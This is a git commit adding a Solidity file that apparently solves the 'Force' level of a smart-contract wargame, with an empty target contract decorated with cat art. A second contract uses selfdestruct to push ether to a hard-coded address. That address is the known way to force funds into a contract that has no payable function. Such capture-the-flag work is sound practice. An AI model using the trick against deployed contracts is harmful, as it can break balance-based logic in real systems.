d38155e16004d4c1990691ecef46038593cc40b2
nikhil arora <narora200@gmail.com>
2022-09-23 18:45:58 +0530

    Level07 doneee

---
+++ src/Level07.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Force {
+    /*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/
+}
+
+contract Solution {
+    constructor() public payable {
+        selfdestruct(0xc0019E68E5c9f46b7F7951F56D1066DE7Da4345F);
+    }
+}
